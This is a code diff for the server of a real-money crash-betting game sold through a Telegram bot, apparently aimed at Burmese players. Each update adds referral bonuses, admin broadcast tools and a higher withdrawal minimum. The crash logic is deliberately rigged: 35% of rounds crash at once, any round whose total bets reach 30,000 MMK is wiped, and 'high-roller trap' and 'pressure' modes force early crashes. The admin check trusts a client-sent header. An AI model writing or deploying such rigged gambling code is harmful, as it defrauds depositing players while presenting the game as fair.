@@ -1,13 +1,15 @@
 /**
  * ═══════════════════════════════════════════════════════════════════════════
- *  CRASH PRO — server.js  v5.0
+ *  CRASH PRO — server.js  v6.0
  *
- *  CHANGES:
- *   1. FOMO trick ဖျက် — cashout ပြီးနောက် "x.xxထိတက်သွားသည်" မပြ
- *   2. 1.00x crash 35% (was 12%) — ပိုများသောအကြိမ် instant total loss
- *   3. 30,000+ total bet → 1.00x crash ချက်ချင်း (total wipe)
- *   4. Telegram Bot /start → welcome + 1000ကျပ် + Play button
- *   5. Telegram Bot /admin → admin only → admin panel link button
+ *  Features:
+ *   1. Referral system — ref_<userId> link မှဝင်မှသာ 100 MMK bonus
+ *   2. Fake ref မရအောင် — RefLog unique + self-ref block
+ *   3. New user / Returning user ကြိုဆိုစာ ခွဲခြား
+ *   4. User message → Admin forward
+ *   5. Admin: stats, broadcast, ref-manage, send-message
+ *   6. MIN_WITHDRAWAL = 10,000 MMK
+ *   7. House edge: 35% instant-loss, high-bet wipe, pressure, roller-trap
  * ═══════════════════════════════════════════════════════════════════════════
  */
 
@@ -46,7 +48,7 @@ app.use(express.urlencoded({ extended: true }));
 const bot       = new Telegraf(process.env.BOT_TOKEN || 'dummy');
 const ADMIN_IDS = (process.env.ADMIN_IDS || '').split(',').filter(Boolean);
 
-// Game & Admin URLs
+const BOT_USERNAME    = 'pitesansharkyamal_bot';
 const GAME_URL        = 'https://crash-gamemoney.vercel.app';
 const ADMIN_PANEL_URL = 'https://crash-gamemoney.vercel.app/admin.html';
 
@@ -80,29 +82,43 @@ const userSchema = new mongoose.Schema({
   totalWins:      { type: Number, default: 0 },
   isBanned:       { type: Boolean, default: false },
   bannedAt: Date, banReason: String,
-  createdAt: { type: Date, default: Date.now },
-  lastActive: { type: Date, default: Date.now },
+  referredBy:     { type: String, default: null },
+  referralCount:  { type: Number, default: 0 },
+  createdAt:      { type: Date, default: Date.now },
+  lastActive:     { type: Date, default: Date.now },
 });
+
 const betSchema = new mongoose.Schema({
-  userId: { type: String, index: true }, username: String,
-  amount: Number, cashoutMultiplier: Number,
-  startedAt: Date, cashedAt: Date,
-  gameId: { type: String, index: true },
-  profit: Number,
-  status: { type: String, enum: ['pending', 'won', 'lost'], default: 'pending' },
+  userId:            { type: String, index: true }, username: String,
+  amount:            Number, cashoutMultiplier: Number,
+  startedAt: Date,   cashedAt: Date,
+  gameId:            { type: String, index: true },
+  profit:            Number,
+  status:            { type: String, enum: ['pending','won','lost'], default: 'pending' },
 });
+
 const transactionSchema = new mongoose.Schema({
-  userId: { type: String, index: true }, username: String,
-  type: { type: String, enum: ['deposit', 'withdraw'] },
-  amount: Number,
-  status: { type: String, enum: ['pending', 'confirmed', 'rejected'], default: 'pending' },
-  accountName: String, accountNumber: String,
-  adminNote: String, confirmedBy: String, confirmedAt: Date,
-  createdAt: { type: Date, default: Date.now },
+  userId:        { type: String, index: true }, username: String,
+  type:          { type: String, enum: ['deposit','withdraw'] },
+  amount:        Number,
+  status:        { type: String, enum: ['pending','confirmed','rejected'], default: 'pending' },
+  accountName:   String, accountNumber: String,
+  adminNote:     String, confirmedBy: String, confirmedAt: Date,
+  createdAt:     { type: Date, default: Date.now },
 });
+
+const refLogSchema = new mongoose.Schema({
+  referrerId:      { type: String, index: true },
+  refereeId:       { type: String, unique: true },
+  refereeUsername: String,
+  bonusPaid:       { type: Number, default: 100 },
+  createdAt:       { type: Date, default: Date.now },
+});
+
 const User        = mongoose.model('User',        userSchema);
 const Bet         = mongoose.model('Bet',         betSchema);
 const Transaction = mongoose.model('Transaction', transactionSchema);
+const RefLog      = mongoose.model('RefLog',      refLogSchema);
 
 // ═══════════════════════════════════════════════════════════════════════════
 //  HOUSE EDGE CONFIG
@@ -110,23 +126,13 @@ const Transaction = mongoose.model('Transaction', transactionSchema);
 const HOUSE = {
   MAX_MULTIPLIER:         15.00,
   FIXED_CAP_MAX:          1.99,
-
-  // ★ Total bet ≥ 30,000 → immediate 1.00x wipe
-  HIGH_BET_THRESHOLD:     30000,
-
-  // ★ 35% of all games → instant 1.00x crash
-  INSTANT_LOSS_RATE:      0.35,
-
-  // Player Entry Trigger
+  HIGH_BET_THRESHOLD:     30000,   // total user bets ≥30k → instant wipe
+  INSTANT_LOSS_RATE:      0.35,    // 35% of games → 1.00x instant crash
   ENTRY_TRIGGER_MAX:      1.50,
-
-  // Pressure mode
   PRESSURE_BALANCE_LIMIT: 5000,
   PRESSURE_TRIGGER_RATE:  0.65,
   PRESSURE_CRASH_MIN:     1.01,
   PRESSURE_CRASH_MAX:     1.12,
-
-  // High-roller trap
   HIGH_ROLLER_THRESHOLD:  8000,
   HIGH_ROLLER_CRASH_MIN:  1.05,
   HIGH_ROLLER_CRASH_MAX:  1.35,
@@ -138,47 +144,28 @@ function r2(n) { return Math.round(n * 100) / 100; }
 const rand = () => Math.random();
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  CRASH POINT  (priority ladder)
-//
-//  1. ★ High bet pool ≥30k  → 1.00x (total wipe)
-//  2. ★ Instant-loss 35%    → 1.00x
-//  3. Pressure mode          → 1.01–1.12x
-//  4. High-roller trap       → 1.05–1.35x
-//  5. Entry Trigger          → 1.05–1.50x
-//  6. Normal                 → 1.10–1.99x
+//  CRASH POINT
 // ═══════════════════════════════════════════════════════════════════════════
 function calculateCrashPoint(totalUserBets = 0, maxSingleBet = 0, hasRealUser = false) {
-
-  // 1. ★ High-bet pool wipe
   if (totalUserBets >= HOUSE.HIGH_BET_THRESHOLD) {
     console.log(`💣 HIGH BET WIPE 1.00x (pool=${totalUserBets})`);
     return 1.00;
   }
-
-  // 2. ★ Instant-loss 35%
   if (rand() < HOUSE.INSTANT_LOSS_RATE) {
     console.log(`🎰 Instant-loss 1.00x`);
     return 1.00;
   }
-
-  // 3. Pressure mode
   if (houseBalance < HOUSE.PRESSURE_BALANCE_LIMIT && rand() < HOUSE.PRESSURE_TRIGGER_RATE) {
     return r2(HOUSE.PRESSURE_CRASH_MIN + rand() * (HOUSE.PRESSURE_CRASH_MAX - HOUSE.PRESSURE_CRASH_MIN));
   }
-
-  // 4. High-roller trap
   if (maxSingleBet >= HOUSE.HIGH_ROLLER_THRESHOLD && rand() < 0.72) {
     return r2(HOUSE.HIGH_ROLLER_CRASH_MIN + rand() * (HOUSE.HIGH_ROLLER_CRASH_MAX - HOUSE.HIGH_ROLLER_CRASH_MIN));
   }
-
-  // 5. Entry Trigger
   if (hasRealUser && rand() < 0.75) {
     const cp = r2(1.05 + rand() * (HOUSE.ENTRY_TRIGGER_MAX - 1.05));
     console.log(`🎯 Entry trigger → ${cp}x`);
     return cp;
   }
-
-  // 6. Normal range
   return r2(1.10 + rand() * (HOUSE.FIXED_CAP_MAX - 1.10));
 }
 
@@ -242,23 +229,24 @@ const MULTIPLIER_TICK_MS = 50;
 const BETWEEN_GAME_MS    = 3000;
 const GROWTH_RATE        = 0.08;
 const TOTAL_PLAYERS      = 6;
-const MIN_WITHDRAWAL     = 5000;
+const MIN_WITHDRAWAL     = 10000;
+const REF_BONUS          = 100;
 
 let roundCounter = 0;
 
 function createFreshState() {
   return {
-    phase:              'idle',
-    gameId:             null,
-    crashPoint:         0,
-    currentMultiplier:  1.0,
-    startTime:          null,
-    bets:               new Map(),
-    totalBetsAmount:    0,
-    totalUserBets:      0,
-    maxSingleUserBet:   0,
-    hasRealUser:        false,
-    history:            [],
+    phase:             'idle',
+    gameId:            null,
+    crashPoint:        0,
+    currentMultiplier: 1.0,
+    startTime:         null,
+    bets:              new Map(),
+    totalBetsAmount:   0,
+    totalUserBets:     0,
+    maxSingleUserBet:  0,
+    hasRealUser:       false,
+    history:           [],
   };
 }
 let G = createFreshState();
@@ -275,63 +263,136 @@ function activeBetsSnapshot() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  ★ TELEGRAM BOT
+//  TELEGRAM BOT
 // ═══════════════════════════════════════════════════════════════════════════
 
-// /start — welcome message + 1000ကျပ် + Play button
+// /start — new user: ကြိုဆို + 1000ကျပ် | returning: ပြန်ကြိုဆို | ref handling
 bot.start(async (ctx) => {
   try {
     const from     = ctx.from;
     const tid      = String(from.id);
     const name     = from.first_name || from.username || 'ဂုဏ်ယူသောကစားသမား';
     const username = from.username
-      || `${from.first_name ?? ''}${from.last_name ? ' '+from.last_name : ''}`.trim()
+      || `${from.first_name ?? ''}${from.last_name ? ' ' + from.last_name : ''}`.trim()
       || `User_${tid.slice(-4)}`;
 
-    // Auto-register new user with 1000 balance
-    try {
-      const existing = await User.findOne({ telegramId: tid });
-      if (!existing) {
-        await User.create({
-          telegramId: tid, username,
-          firstName: from.first_name,
-          lastName: from.last_name,
-          balance: 1000,
-        });
-        console.log(`🆕 New user: ${username} (${tid})`);
+    // Parse referral payload: /start ref_<referrerId>
+    const payload    = ctx.startPayload || '';
+    const referrerId = payload.startsWith('ref_') ? payload.slice(4) : null;
+
+    const existing = await User.findOne({ telegramId: tid });
+    let isNew = false;
+
+    if (!existing) {
+      isNew = true;
+      await User.create({
+        telegramId: tid, username,
+        firstName:  from.first_name, lastName: from.last_name,
+        balance:    1000,
+        referredBy: referrerId && referrerId !== tid ? referrerId : null,
+      });
+
+      // Pay referral bonus — anti-fake: unique referee, no self-ref
+      if (referrerId && referrerId !== tid) {
+        const alreadyReferred = await RefLog.findOne({ refereeId: tid });
+        if (!alreadyReferred) {
+          const referrer = await User.findOne({ telegramId: referrerId });
+          if (referrer) {
+            const updatedReferrer = await User.findOneAndUpdate(
+              { telegramId: referrerId },
+              { $inc: { balance: REF_BONUS, referralCount: 1 } },
+              { new: true }
+            );
+            await RefLog.create({ referrerId, refereeId: tid, refereeUsername: username, bonusPaid: REF_BONUS });
+            io.emit('balanceUpdate', { userId: referrerId, balance: updatedReferrer.balance });
+            // Notify referrer
+            try {
+              await bot.telegram.sendMessage(
+                referrerId,
+                `🎉 <b>သူငယ်ချင်း ဖိတ်ခေါ်မှု အောင်မြင်!</b>\n\n` +
+                `👤 <b>${username}</b> သင့် Link မှ ဝင်ရောက်သွားသည်။\n` +
+                `💰 <b>${REF_BONUS} MMK</b> Bonus သင့် Account ထဲ ထည့်သွင်းပြီးပါပြီ။`,
+                { parse_mode: 'HTML' }
+              );
+            } catch {}
+          }
+        }
       }
-    } catch (dbErr) {
-      console.error('DB /start error:', dbErr.message);
+
+      console.log(`🆕 New user: ${username} (${tid}) ref=${referrerId}`);
+
+      // Notify admins
+      for (const adminId of ADMIN_IDS) {
+        try {
+          await bot.telegram.sendMessage(
+            adminId,
+            `🆕 <b>User အသစ် ဝင်ရောက်!</b>\n👤 ${username} (ID: <code>${tid}</code>)\n🔗 Ref: ${referrerId || 'မရှိ'}`,
+            { parse_mode: 'HTML' }
+          );
+        } catch {}
+      }
+
+    } else {
+      if (existing.isBanned) {
+        return ctx.reply('⛔ သင့် Account ကို ပိတ်ထားသည်။');
+      }
+      existing.lastActive = new Date();
+      await existing.save();
     }
 
-    await ctx.replyWithHTML(
-      `🎉 <b>ကြိုဆိုပါတယ် ${name}!</b>\n\n` +
-      `🎁 ကြိုဆိုလက်ဆောင် <b>1,000 ကျပ်</b> ရရှိပါသည်။\n\n` +
-      `💰 ပိုက်ဆံရှာပြီး ဂိမ်းကစားရန် <b>Play</b> button ကိုနှိပ်ပါ။`,
-      Markup.inlineKeyboard([
-        [Markup.button.webApp('🎮 Play Now', GAME_URL)],
-      ])
-    );
+    if (isNew) {
+      await ctx.replyWithHTML(
+        `🎉 <b>ကြိုဆိုပါတယ် ${name}!</b>\n\n` +
+        `🎁 ကြိုဆိုလက်ဆောင် <b>1,000 ကျပ်</b> ရရှိပါသည်။\n\n` +
+        `💰 ပိုက်ဆံရှာပြီး ဂိမ်းကစားရန် <b>Play</b> button ကိုနှိပ်ပါ။`,
+        Markup.inlineKeyboard([
+          [Markup.button.webApp('🎮 Play Now', GAME_URL)],
+        ])
+      );
+    } else {
+      await ctx.replyWithHTML(
+        `🎉 <b>ပြန်လည် ကြိုဆိုပါတယ် ${name}!</b>\n\n` +
+        `💰 ပိုက်ဆံရှာပြီး ဂိမ်းကစားရန် <b>Play</b> button ကိုနှိပ်ပါ။`,
+        Markup.inlineKeyboard([
+          [Markup.button.webApp('🎮 Play Now', GAME_URL)],
+        ])
+      );
+    }
   } catch (err) {
     console.error('/start handler error:', err.message);
   }
 });
 
-// /admin — admin only → sends admin panel button
+// /admin — admin only → admin panel button
 bot.command('admin', async (ctx) => {
   const tid = String(ctx.from.id);
-
   if (!ADMIN_IDS.includes(tid)) {
     return ctx.reply('⛔ Admin access မရှိပါ။');
   }
-
   await ctx.replyWithHTML(
-    `🔐 <b>Admin Panel</b>\n\n` +
-    `Admin menu ကိုဝင်ရောက်ရန် အောက်ပါ button ကိုနှိပ်ပါ။`,
+    `🔐 <b>Admin Panel</b>\n\nAdmin menu ကိုဝင်ရောက်ရန် အောက်ပါ button ကိုနှိပ်ပါ။`,
     Markup.inlineKeyboard([
       [Markup.button.url('⚙️ Admin Panel ဝင်ရန်', ADMIN_PANEL_URL)],
     ])
   );
+});
+
+// Forward any user text message to admins
+bot.on('text', async (ctx) => {
+  const tid = String(ctx.from.id);
+  if (ADMIN_IDS.includes(tid)) return;
+  const name = ctx.from.username || ctx.from.first_name || tid;
+  const text = ctx.message.text;
+  if (text.startsWith('/')) return; // skip commands
+  for (const adminId of ADMIN_IDS) {
+    try {
+      await bot.telegram.sendMessage(
+        adminId,
+        `📨 <b>User Message</b>\n👤 ${name} (ID: <code>${tid}</code>)\n\n${text}`,
+        { parse_mode: 'HTML' }
+      );
+    } catch {}
+  }
 });
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -370,11 +431,7 @@ async function runCountdown() {
   await sleep(COUNTDOWN_SECONDS * 1000);
 
   G.crashPoint = calculateCrashPoint(G.totalUserBets, G.maxSingleUserBet, G.hasRealUser);
-
-  console.log(
-    `📊 Round ${roundCounter} | crash=${G.crashPoint}x | ` +
-    `userBets=${G.totalUserBets} | hasReal=${G.hasRealUser} | house=${houseBalance}`
-  );
+  console.log(`📊 Round ${roundCounter} | crash=${G.crashPoint}x | userBets=${G.totalUserBets} | hasReal=${G.hasRealUser} | house=${houseBalance}`);
 }
 
 async function runGame() {
@@ -382,11 +439,10 @@ async function runGame() {
   G.startTime = Date.now();
   io.emit('gameStart', { gameId: G.gameId, bets: activeBetsSnapshot() });
 
-  // ★ For 1.00x crash — emit once then crash immediately
   if (G.crashPoint <= 1.00) {
     G.currentMultiplier = 1.00;
     io.emit('multiplier', { multiplier: 1.00, phase: 'running', ts: Date.now() });
-    await sleep(300); // brief pause so client sees 1.00x
+    await sleep(300);
     await crashGame();
     return;
   }
@@ -509,10 +565,9 @@ async function cashOut(userId, clientMultiplier, clientGameId) {
       Bet.findOneAndUpdate({ userId, gameId: G.gameId }, { cashoutMultiplier: multiplier, profit, status: 'won', cashedAt: new Date() }).catch(e => console.error('Bet update:', e));
       io.emit('balanceUpdate', { userId, balance: user.balance });
     }
-    // ★ No visualCrashHint — FOMO removed
-    io.emit('betResult', { success: true, type: 'cashout', userId, gameId: G.gameId, multiplier, profit, betAmount: bet.amount, totalReturn });
-    io.emit('newHistory', { username: bet.username, start: 1.0, stop: multiplier, profit, isBot: false, status: 'won' });
-    io.emit('activeBets', { bets: activeBetsSnapshot() });
+    io.emit('betResult',   { success: true, type: 'cashout', userId, gameId: G.gameId, multiplier, profit, betAmount: bet.amount, totalReturn });
+    io.emit('newHistory',  { username: bet.username, start: 1.0, stop: multiplier, profit, isBot: false, status: 'won' });
+    io.emit('activeBets',  { bets: activeBetsSnapshot() });
     return { success: true, multiplier, profit, totalReturn, newBalance: user?.balance };
   } catch (err) {
     console.error('cashOut:', err);
@@ -545,7 +600,7 @@ function placeBotBets() {
 }
 
 function processBotCashouts() {
-  if (G.crashPoint <= 1.00) return; // no bots cash out on instant-loss rounds
+  if (G.crashPoint <= 1.00) return;
   const isLowCrash = G.crashPoint <= 1.5;
   for (const [uid, bet] of G.bets.entries()) {
     if (!bet.isBot || bet.cashedAt) continue;
@@ -584,7 +639,7 @@ io.on('connection', (socket) => {
   socket.userId = socket.handshake.query.userId || null;
   console.log(`🟢 [${socket.id}] uid=${socket.userId}`);
 
-  socket.emit('gameState', { phase: G.phase, gameId: G.gameId, multiplier: G.currentMultiplier, history: G.history.slice(0, 10), ts: Date.now() });
+  socket.emit('gameState',  { phase: G.phase, gameId: G.gameId, multiplier: G.currentMultiplier, history: G.history.slice(0, 10), ts: Date.now() });
   socket.emit('activeBets', { bets: activeBetsSnapshot() });
   if (G.phase === 'running') {
     socket.emit('multiplier', { multiplier: G.currentMultiplier, phase: 'running', ts: Date.now() });
@@ -608,6 +663,8 @@ io.on('connection', (socket) => {
 // ═══════════════════════════════════════════════════════════════════════════
 //  API ROUTES
 // ═══════════════════════════════════════════════════════════════════════════
+
+// Auth / register
 app.post('/api/auth', async (req, res) => {
   try {
     const { id, username, first_name, last_name } = req.body;
@@ -624,6 +681,7 @@ app.post('/api/auth', async (req, res) => {
   } catch { res.status(500).json({ success: false, message: 'Server error' }); }
 });
 
+// Deposit request
 app.post('/api/deposit', async (req, res) => {
   try {
     const { userId, username, name, phone, amount } = req.body;
@@ -633,13 +691,18 @@ app.post('/api/deposit', async (req, res) => {
   } catch { res.status(500).json({ success: false, message: 'Server error' }); }
 });
 
+// Withdraw request
 app.post('/api/withdraw', async (req, res) => {
   try {
     const { userId, username, name, phone, amount } = req.body;
     const amt = Number(amount);
     if (!userId || !name || !phone || !amt || amt <= 0) return res.status(400).json({ success: false, message: 'Invalid data' });
     if (amt < MIN_WITHDRAWAL) return res.status(400).json({ success: false, message: `အနည်းဆုံး ${MIN_WITHDRAWAL.toLocaleString()} MMK ထုတ်ရမည်` });
-    const user = await User.findOneAndUpdate({ telegramId: userId, balance: { $gte: amt } }, { $inc: { balance: -amt, totalWithdrawn: amt } }, { new: true });
+    const user = await User.findOneAndUpdate(
+      { telegramId: userId, balance: { $gte: amt } },
+      { $inc: { balance: -amt, totalWithdrawn: amt } },
+      { new: true }
+    );
     if (!user) {
       const ex = await User.findOne({ telegramId: userId });
       return res.status(400).json({ success: false, message: ex ? 'လက်ကျန်မလုံလောက်' : 'User not found' });
@@ -650,15 +713,37 @@ app.post('/api/withdraw', async (req, res) => {
   } catch { res.status(500).json({ success: false, message: 'Server error' }); }
 });
 
+// Referral info for user
+app.get('/api/ref/:userId', async (req, res) => {
+  try {
+    const refCount  = await RefLog.countDocuments({ referrerId: req.params.userId });
+    const earnedAgg = await RefLog.aggregate([{ $match: { referrerId: req.params.userId } }, { $group: { _id: null, total: { $sum: '$bonusPaid' } } }]);
+    res.json({ success: true, refCount, refEarned: earnedAgg[0]?.total || 0 });
+  } catch { res.status(500).json({ success: false }); }
+});
+
+// ── Admin guard ────────────────────────────────────────────────────────────────
 function adminGuard(req, res, next) {
   const id = req.headers['x-telegram-id'];
   if (!id || !ADMIN_IDS.includes(id)) return res.status(403).json({ success: false, message: 'Unauthorized' });
   next();
 }
 
-app.get('/api/admin/users',        adminGuard, async (req, res) => { try { res.json({ success: true, users: await User.find().sort({ createdAt: -1 }).limit(200).lean() }); } catch { res.status(500).json({ success: false }); } });
-app.get('/api/admin/transactions', adminGuard, async (req, res) => { try { res.json({ success: true, transactions: await Transaction.find().sort({ createdAt: -1 }).limit(200).lean() }); } catch { res.status(500).json({ success: false }); } });
+// Admin — users list
+app.get('/api/admin/users', adminGuard, async (req, res) => {
+  try {
+    res.json({ success: true, users: await User.find().sort({ createdAt: -1 }).limit(500).lean() });
+  } catch { res.status(500).json({ success: false }); }
+});
 
+// Admin — transactions list
+app.get('/api/admin/transactions', adminGuard, async (req, res) => {
+  try {
+    res.json({ success: true, transactions: await Transaction.find().sort({ createdAt: -1 }).limit(500).lean() });
+  } catch { res.status(500).json({ success: false }); }
+});
+
+// Admin — edit user balance
 app.post('/api/admin/user/balance', adminGuard, async (req, res) => {
   try {
     const { userId, action, amount } = req.body;
@@ -677,22 +762,27 @@ app.post('/api/admin/user/balance', adminGuard, async (req, res) => {
   } catch { res.status(500).json({ success: false }); }
 });
 
+// Admin — ban / unban user
 app.post('/api/admin/user/ban', adminGuard, async (req, res) => {
   try {
     const { userId, ban, reason } = req.body;
-    const upd = ban ? { isBanned: true, banReason: reason || '', bannedAt: new Date() } : { isBanned: false, banReason: null, bannedAt: null };
+    const upd = ban
+      ? { isBanned: true,  banReason: reason || '', bannedAt: new Date() }
+      : { isBanned: false, banReason: null, bannedAt: null };
     const user = await User.findOneAndUpdate({ telegramId: userId }, upd);
     if (!user) return res.status(404).json({ success: false });
     res.json({ success: true });
   } catch { res.status(500).json({ success: false }); }
 });
 
+// Admin — process transaction (confirm / reject)
 app.post('/api/admin/transaction/process', adminGuard, async (req, res) => {
   try {
     const { transactionId, status, adminNote } = req.body;
     const tx = await Transaction.findById(transactionId);
     if (!tx)                     return res.status(404).json({ success: false, message: 'Not found' });
     if (tx.status !== 'pending') return res.status(400).json({ success: false, message: 'Already processed' });
+
     if (status === 'confirmed' && tx.type === 'deposit') {
       const u = await User.findOneAndUpdate({ telegramId: tx.userId }, { $inc: { balance: tx.amount, totalDeposited: tx.amount } }, { new: true });
       if (u) io.emit('balanceUpdate', { userId: tx.userId, balance: u.balance });
@@ -701,13 +791,98 @@ app.post('/api/admin/transaction/process', adminGuard, async (req, res) => {
       const u = await User.findOneAndUpdate({ telegramId: tx.userId }, { $inc: { balance: tx.amount, totalWithdrawn: -tx.amount } }, { new: true });
       if (u) io.emit('balanceUpdate', { userId: tx.userId, balance: u.balance });
     }
+
     tx.status = status; tx.adminNote = adminNote || '';
     tx.confirmedBy = req.headers['x-telegram-id']; tx.confirmedAt = new Date();
     await tx.save();
+
+    // Notify user
+    try {
+      const msg = status === 'confirmed'
+        ? `✅ <b>ငွေ${tx.type === 'deposit' ? 'သွင်း' : 'ထုတ်'} အတည်ပြုပြီး!</b>\n💰 ${tx.amount.toLocaleString()} MMK`
+        : `❌ <b>ငွေ${tx.type === 'deposit' ? 'သွင်း' : 'ထုတ်'} ငြင်းပယ်ခြင်း</b>\n💰 ${tx.amount.toLocaleString()} MMK\n${adminNote ? '📝 ' + adminNote : ''}`;
+      await bot.telegram.sendMessage(tx.userId, msg, { parse_mode: 'HTML' });
+    } catch {}
+
     res.json({ success: true });
   } catch { res.status(500).json({ success: false }); }
 });
 
+// Admin — stats overview
+app.get('/api/admin/stats', adminGuard, async (req, res) => {
+  try {
+    const [totalUsers, betsAgg, txAgg] = await Promise.all([
+      User.countDocuments(),
+      Bet.aggregate([{ $group: {
+        _id: null,
+        totalBets: { $sum: '$amount' },
+        totalWon:  { $sum: { $cond: [{ $eq: ['$status','won']  }, '$profit', 0] } },
+        totalLost: { $sum: { $cond: [{ $eq: ['$status','lost'] }, '$amount', 0] } },
+        countBets: { $sum: 1 },
+      }}]),
+      Transaction.aggregate([{ $match: { status: 'confirmed' } }, { $group: { _id: '$type', total: { $sum: '$amount' } } }]),
+    ]);
+    const bets  = betsAgg[0] || { totalBets:0, totalWon:0, totalLost:0, countBets:0 };
+    const dep   = txAgg.find(t => t._id === 'deposit')?.total  || 0;
+    const with_ = txAgg.find(t => t._id === 'withdraw')?.total || 0;
+    const totalRefs = await RefLog.countDocuments();
+    res.json({ success: true, totalUsers, totalRefs, houseBalance, round: roundCounter,
+      bets: { count: bets.countBets, volume: bets.totalBets, won: bets.totalWon, lost: bets.totalLost },
+      transactions: { deposited: dep, withdrawn: with_ }
+    });
+  } catch { res.status(500).json({ success: false }); }
+});
+
+// Admin — referrals list
+app.get('/api/admin/refs', adminGuard, async (req, res) => {
+  try {
+    res.json({ success: true, refs: await RefLog.find().sort({ createdAt: -1 }).limit(500).lean() });
+  } catch { res.status(500).json({ success: false }); }
+});
+
+// Admin — delete ref (+ optional clawback)
+app.post('/api/admin/ref/delete', adminGuard, async (req, res) => {
+  try {
+    const { refId, clawback } = req.body;
+    const ref = await RefLog.findById(refId);
+    if (!ref) return res.status(404).json({ success: false });
+    if (clawback) {
+      await User.findOneAndUpdate({ telegramId: ref.referrerId }, { $inc: { balance: -ref.bonusPaid, referralCount: -1 } });
+    }
+    await RefLog.findByIdAndDelete(refId);
+    res.json({ success: true });
+  } catch { res.status(500).json({ success: false }); }
+});
+
+// Admin — broadcast to all users
+app.post('/api/admin/broadcast', adminGuard, async (req, res) => {
+  try {
+    const { message } = req.body;
+    if (!message) return res.status(400).json({ success: false });
+    const users = await User.find({ isBanned: false }, 'telegramId').lean();
+    let sent = 0, failed = 0;
+    for (const u of users) {
+      try {
+        await bot.telegram.sendMessage(u.telegramId, message, { parse_mode: 'HTML' });
+        sent++;
+        await new Promise(r => setTimeout(r, 50));
+      } catch { failed++; }
+    }
+    res.json({ success: true, sent, failed });
+  } catch { res.status(500).json({ success: false }); }
+});
+
+// Admin — send direct message to user
+app.post('/api/admin/send-message', adminGuard, async (req, res) => {
+  try {
+    const { userId, message } = req.body;
+    if (!userId || !message) return res.status(400).json({ success: false });
+    await bot.telegram.sendMessage(userId, message, { parse_mode: 'HTML' });
+    res.json({ success: true });
+  } catch (e) { res.status(500).json({ success: false, message: e.message }); }
+});
+
+// Admin — get / set house balance
 app.get('/api/admin/house', adminGuard, (req, res) => {
   res.json({ success: true, houseBalance, round: roundCounter, phase: G.phase, bots: BOT_POOL.size });
 });
@@ -717,6 +892,8 @@ app.post('/api/admin/house/balance', adminGuard, (req, res) => {
   houseBalance = amt;
   res.json({ success: true, houseBalance });
 });
+
+// Health check
 app.get('/health', (req, res) => res.json({ status: 'ok', phase: G.phase, round: roundCounter, bots: BOT_POOL.size, db: dbReady, house: houseBalance }));
 
 // ─── Start ────────────────────────────────────────────────────────────────────
